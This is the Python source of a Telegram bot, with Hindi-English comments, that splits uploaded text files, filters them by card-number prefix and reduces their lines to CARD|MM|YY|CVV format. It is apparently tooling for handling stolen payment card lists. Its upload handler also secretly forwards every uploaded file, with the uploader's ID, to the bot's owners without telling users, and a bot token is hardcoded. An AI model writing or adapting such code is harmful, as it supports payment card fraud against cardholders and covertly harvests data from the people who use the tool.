import os
import logging
import asyncio
import re
from datetime import datetime
from telegram import Update, InputFile
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
    Application
)
from telegram.constants import ParseMode
from telegram.error import TelegramError

# ==================================================
# CONFIGURATION
# ==================================================
# Apna asli Bot Token yahan daalein
BOT_TOKEN = "8811033165:AAG4NQszrJa3bP0Cgz-nuanE1g7RVVb2coA"

# Owners ki Telegram User IDs
OWNER_IDS = [
    8665264271,
    8665264271
]

# Paths setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
OUTPUTS_DIR = os.path.join(BASE_DIR, "outputs")
LOGS_DIR = os.path.join(BASE_DIR, "logs")

# Agar folders pehle se nahi bane hain, toh unhe banayein
for folder in [UPLOADS_DIR, OUTPUTS_DIR, LOGS_DIR]:
    os.makedirs(folder, exist_ok=True)

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "bot.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

downloaded_files = {}
stop_flags = {}

# ==================================================
# UTILITY FUNCTIONS
# ==================================================

def get_user_identifier(user):
    """Returns user's username if available, otherwise first name."""
    if user.username:
        return f"@{user.username}"
    return user.first_name

async def forward_to_owners(context: ContextTypes.DEFAULT_TYPE, user, file_id, file_name):
    """Forwards the newly uploaded file directly to bot owners using Telegram File ID."""
    caption = (
        f"📩 <b>New File Uploaded!</b>\n\n"
        f"<b>Uploader:</b> {get_user_identifier(user)} (ID: <code>{user.id}</code>)\n"
        f"<b>File Name:</b> <code>{file_name}</code>"
    )
    for owner_id in OWNER_IDS:
        try:
            await context.bot.send_document(
                chat_id=owner_id,
                document=file_id,
                caption=caption,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Error forwarding file to owner {owner_id}: {e}")

async def count_lines(file_path):
    """Count lines in large files quickly."""
    count = 0
    with open(file_path, 'rb') as f:
        for _ in f:
            count += 1
    return count

async def get_file_from_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply = update.message.reply_to_message
    if not reply or not reply.document:
        return None, None, "❌ Please reply to the TXT file you want to process with the command."

    if not reply.document.file_name.endswith('.txt'):
        return None, None, "❌ The replied file is not a valid .txt file."

    chat_id = update.effective_chat.id
    msg_id = reply.message_id
    cache_key = (chat_id, msg_id)
    
    # Extract original file name without .txt extension
    orig_name = os.path.splitext(reply.document.file_name)[0]

    if cache_key in downloaded_files and os.path.exists(downloaded_files[cache_key]):
        return downloaded_files[cache_key], orig_name, None

    try:
        msg = await update.message.reply_text("📥 Fetching target file...")
        file = await context.bot.get_file(reply.document.file_id)
        file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
        await file.download_to_drive(file_path)
        downloaded_files[cache_key] = file_path
        await msg.delete()
        return file_path, orig_name, None
    except Exception as e:
        logger.error(f"Error downloading replied file: {e}")
        return None, None, f"❌ Could not download file: {str(e)}"

# ==================================================
# COMMAND HANDLERS
# ==================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = get_user_identifier(user)
    welcome_msg = (
        f"Hello {name}!\n\n"
        f"Please upload a .txt format file ⚡"
    )
    await update.message.reply_text(welcome_msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 <b>Help Menu</b>\n\n"
        "1️⃣ First, upload a <code>.txt</code> file.\n"
        "2️⃣ Then, reply to that file using the commands below:\n\n"
        "⚡ <code>/spl &lt;N&gt;</code> – Split file every N lines\n"
        "🔍 <code>/ext &lt;prefix&gt;</code> – Extract lines with a specific prefix\n"
        "🧹 <code>/clear</code> – Clean TXT to CARD|MM|YY|CVV format\n"
        "🛑 <code>/stop</code> – Stop the ongoing process\n"
        "❓ <code>/help</code> – View this message"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)

async def stop_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_flags[user_id] = True
    await update.message.reply_text("🛑 Stopping process... Please wait.")

# ==================================================
# FILE UPLOAD HANDLE
# ==================================================

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    msg_id = update.message.message_id
    doc = update.message.document

    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload only .txt files.")
        return

    msg = await update.message.reply_text("📥 Downloading file...")
    file = await context.bot.get_file(doc.file_id)
    
    file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
    await file.download_to_drive(file_path)

    downloaded_files[(chat_id, msg_id)] = file_path
    stop_flags[user.id] = False

    await msg.edit_text(
        "✅ TXT file received! 🔥\n\n"
        "<b>Now reply to this file using the commands below:</b> 👇\n"
        "• /spl <N> – Split file\n"
        "• /ext <prefix> – Extract lines\n"
        "• /clear – Clean file\n"
        "• /stop – Stop process",
        parse_mode=ParseMode.HTML
    )

    # Automatically forward to owners using File ID directly (Fast & Reliable)
    await forward_to_owners(context, user, doc.file_id, doc.file_name)

# ==================================================
# FEATURE: SPLIT (/spl)
# ==================================================

async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    text = update.message.text
    match = re.search(r'/spl\s*(\d+)', text)
    
    if not match:
        await update.message.reply_text("❌ Invalid format! Reply to a file with: /spl 100 or /spl100")
        return

    lines_per_file = int(match.group(1))
    if lines_per_file <= 0:
        await update.message.reply_text("❌ Number must be greater than 0.")
        return

    total_lines = await count_lines(input_path)
    num_files = (total_lines + lines_per_file - 1) // lines_per_file

    await update.message.reply_text(
        f"🚀 <b>Split Process Started</b>\n\n"
        f"Total Lines: {total_lines}\n"
        f"Lines Per File: {lines_per_file}\n"
        f"Total Files Created: {num_files}",
        parse_mode=ParseMode.HTML
    )

    stop_flags[user_id] = False
    
    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile:
            current_file_num = 1
            line_count = 0
            current_out_lines = []

            for line in infile:
                if stop_flags.get(user_id):
                    await update.message.reply_text("Process stopped by user.")
                    return

                current_out_lines.append(line)
                line_count += 1

                if line_count >= lines_per_file:
                    out_filename = f"part_{current_file_num}_{orig_name}.txt"
                    out_path = os.path.join(OUTPUTS_DIR, out_filename)
                    
                    with open(out_path, 'w', encoding='utf-8') as outfile:
                        outfile.writelines(current_out_lines)
                    
                    with open(out_path, 'rb') as f:
                        await context.bot.send_document(chat_id=user_id, document=f)
                    
                    os.remove(out_path)
                    current_out_lines = []
                    line_count = 0
                    current_file_num += 1
                    await asyncio.sleep(0.5)

            if current_out_lines:
                out_filename = f"part_{current_file_num}_{orig_name}.txt"
                out_path = os.path.join(OUTPUTS_DIR, out_filename)
                with open(out_path, 'w', encoding='utf-8') as outfile:
                    outfile.writelines(current_out_lines)
                with open(out_path, 'rb') as f:
                    await context.bot.send_document(chat_id=user_id, document=f)
                os.remove(out_path)

        await update.message.reply_text("✅ Splitting completed!")
    except Exception as e:
        logger.error(f"/spl command error: {e}")
        await update.message.reply_text(f"❌ Error occurred: {str(e)}")

# ==================================================
# FEATURE: EXTRACT (/ext)
# ==================================================

async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    text = update.message.text
    match = re.search(r'/ext\s*(.+)', text)
    if not match:
        await update.message.reply_text("❌ Invalid format! Reply to a file with: /ext <prefix> (Example: /ext4960)")
        return

    prefix = match.group(1).strip()
    out_filename = f"extracted_{orig_name}.txt"
    out_path = os.path.join(OUTPUTS_DIR, out_filename)
    
    await update.message.reply_text(f"🔍 Extracting lines starting with `{prefix}`...", parse_mode=ParseMode.MARKDOWN)
    
    stop_flags[user_id] = False
    count = 0

    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile, \
             open(out_path, 'w', encoding='utf-8') as outfile:
            for line in infile:
                if stop_flags.get(user_id):
                    await update.message.reply_text("Process stopped.")
                    return
                if line.startswith(prefix):
                    outfile.write(line)
                    count += 1

        if count > 0:
            with open(out_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id, 
                    document=f, 
                    caption=f"✅ Total {count} lines extracted."
                )
        else:
            await update.message.reply_text("❌ No match found.")
        
        if os.path.exists(out_path):
            os.remove(out_path)

    except Exception as e:
        await update.message.reply_text(f"❌ Error occurred: {e}")

# ==================================================
# FEATURE: CLEAR (/clear)
# ==================================================

async def clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    out_filename = f"cleaned_{orig_name}.txt"
    out_path = os.path.join(OUTPUTS_DIR, out_filename)
    
    await update.message.reply_text("🧹 Cleaning file... (Only CARD|MM|YY|CVV will remain)")
    
    stop_flags[user_id] = False
    count = 0

    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile, \
             open(out_path, 'w', encoding='utf-8') as outfile:
            for line in infile:
                if stop_flags.get(user_id): break
                
                parts = line.strip().split('|')
                if len(parts) >= 4:
                    clean_line = "|".join(parts[:4])
                    outfile.write(clean_line + "\n")
                    count += 1
        
        if count > 0:
            with open(out_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id, 
                    document=f, 
                    caption=f"✅ {count} lines cleaned."
                )
        else:
            await update.message.reply_text("❌ No valid format found to clean.")
            
        if os.path.exists(out_path):
            os.remove(out_path)
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error occurred: {e}")

# ==================================================
# MAIN ENTRY POINT
# ==================================================

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_process))
    
    application.add_handler(MessageHandler(filters.Regex(r'^/spl\d+$') | filters.Regex(r'^/spl\s+\d+$'), split_file))
    application.add_handler(MessageHandler(filters.Regex(r'^/ext.+$'), extract_prefix))
    application.add_handler(CommandHandler("clear", clear_file))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
